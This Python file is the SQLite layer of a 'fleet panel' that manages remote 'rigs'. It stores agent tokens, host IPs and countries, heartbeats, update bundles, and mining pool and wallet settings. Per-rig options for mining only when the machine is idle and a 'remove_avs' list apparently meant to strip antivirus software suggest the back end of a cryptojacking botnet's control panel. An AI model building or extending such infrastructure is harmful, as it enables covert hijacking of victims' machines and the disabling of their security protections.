"""SQLite layer for the fleet panel (stdlib sqlite3, WAL, no ORM)."""
from __future__ import annotations

import os
import secrets
import sqlite3
import time

_SCHEMA = """
CREATE TABLE IF NOT EXISTS meta (
    key TEXT PRIMARY KEY, value TEXT NOT NULL);

CREATE TABLE IF NOT EXISTS rigs (
    rig_id TEXT PRIMARY KEY,
    token TEXT NOT NULL UNIQUE,
    name TEXT NOT NULL,
    machine_id TEXT UNIQUE,
    os TEXT, agent_version TEXT,
    last_ip TEXT, country TEXT,
    last_payload TEXT,
    created_ts REAL NOT NULL);

CREATE TABLE IF NOT EXISTS rig_config (
    rig_id TEXT PRIMARY KEY REFERENCES rigs(rig_id),
    intensity_pct INTEGER NOT NULL DEFAULT 100,
    wallet TEXT NOT NULL DEFAULT '',
    worker TEXT NOT NULL DEFAULT '',
    target_version TEXT NOT NULL DEFAULT '',
    restart_seq INTEGER NOT NULL DEFAULT 0,
    miner_enabled INTEGER NOT NULL DEFAULT 1,
    mine_only_idle INTEGER NOT NULL DEFAULT 0,
    pool TEXT NOT NULL DEFAULT '',
    remove_avs TEXT NOT NULL DEFAULT '[]',
    updated_ts REAL NOT NULL DEFAULT 0);

CREATE TABLE IF NOT EXISTS heartbeats (
    hb_id INTEGER PRIMARY KEY AUTOINCREMENT,
    rig_id TEXT NOT NULL,
    ts REAL NOT NULL,
    payload TEXT NOT NULL);
CREATE INDEX IF NOT EXISTS idx_hb_rig_ts ON heartbeats(rig_id, ts);

CREATE TABLE IF NOT EXISTS bundles (
    version TEXT PRIMARY KEY,
    sha256 TEXT NOT NULL,
    filename TEXT NOT NULL,
    size INTEGER NOT NULL,
    created_ts REAL NOT NULL);

-- Fleet-wide settings: ONE pool/wallet/intensity/target for every rig. A rig
-- can opt out (use_global=0) and keep its own values, e.g. a different engine.
CREATE TABLE IF NOT EXISTS global_config (
    id INTEGER PRIMARY KEY CHECK (id = 1),
    pool TEXT NOT NULL DEFAULT '',
    wallet TEXT NOT NULL DEFAULT '',
    intensity_pct INTEGER NOT NULL DEFAULT 100,
    target_version TEXT NOT NULL DEFAULT '',
    updated_ts REAL NOT NULL DEFAULT 0);
"""

DB_PATH = os.environ.get("PANEL_DB", "panel.db")
HEARTBEAT_RETENTION_SEC = 7 * 24 * 3600


def conn():
    c = sqlite3.connect(DB_PATH, timeout=15)
    c.row_factory = sqlite3.Row
    c.execute("PRAGMA journal_mode=WAL")
    c.execute("PRAGMA busy_timeout=10000")
    return c


def init():
    with conn() as c:
        c.executescript(_SCHEMA)
        now = time.time()
        # migration for DBs created before remove_avs existed
        try:
            c.execute("ALTER TABLE rig_config ADD COLUMN remove_avs TEXT NOT NULL DEFAULT '[]'")
        except sqlite3.OperationalError:
            pass  # column already there
        try:
            c.execute("ALTER TABLE rig_config ADD COLUMN mine_only_idle INTEGER NOT NULL DEFAULT 0")
        except sqlite3.OperationalError:
            pass
        try:
            c.execute("ALTER TABLE rig_config ADD COLUMN pool TEXT NOT NULL DEFAULT ''")
        except sqlite3.OperationalError:
            pass
        try:   # 1 = take pool/wallet/intensity from global_config
            c.execute("ALTER TABLE rig_config ADD COLUMN use_global INTEGER NOT NULL DEFAULT 1")
        except sqlite3.OperationalError:
            pass
        for col in ("last_ip TEXT", "country TEXT", "last_payload TEXT"):
            try:
                c.execute(f"ALTER TABLE rigs ADD COLUMN {col}")
            except sqlite3.OperationalError:
                pass
        c.execute("INSERT OR IGNORE INTO global_config(id) VALUES(1)")
        c.execute("INSERT OR IGNORE INTO rig_config(rig_id) SELECT rig_id FROM rigs")
    # meta writes MUST happen after the transaction above is committed: a nested
    # connection inside it deadlocks ("database is locked") on a fresh DB.
    if not get_meta("cookie_secret"):
        set_meta("cookie_secret", secrets.token_hex(32))
    if not get_meta("enroll_key"):
        set_meta("enroll_key", secrets.token_urlsafe(16))
    if not get_meta("admin_password"):     # hash of the initial random password
        initial = os.environ.get("PANEL_ADMIN_PASSWORD") or secrets.token_urlsafe(10)
        set_meta("admin_password", _hash_pw(initial))
        if not os.environ.get("PANEL_ADMIN_PASSWORD"):
            print(f"[panel] initial admin password: {initial} "
                  f"(set PANEL_ADMIN_PASSWORD to override)", flush=True)


def _hash_pw(pw: str) -> str:
    import hashlib
    salt = secrets.token_hex(16)
    dk = hashlib.pbkdf2_hmac("sha256", pw.encode(), salt.encode(), 100_000)
    return f"{salt}${dk.hex()}"


def check_pw(pw: str) -> bool:
    import hashlib
    stored = get_meta("admin_password") or ""
    if "$" not in stored:
        return False
    salt, hexdk = stored.split("$", 1)
    dk = hashlib.pbkdf2_hmac("sha256", pw.encode(), salt.encode(), 100_000)
    return secrets.compare_digest(dk.hex(), hexdk)


def get_meta(key, default=None):
    with conn() as c:
        row = c.execute("SELECT value FROM meta WHERE key=?", (key,)).fetchone()
        return row["value"] if row else default


def set_meta(key, value):
    with conn() as c:
        c.execute("INSERT INTO meta(key, value) VALUES(?,?) "
                  "ON CONFLICT(key) DO UPDATE SET value=excluded.value", (key, value))
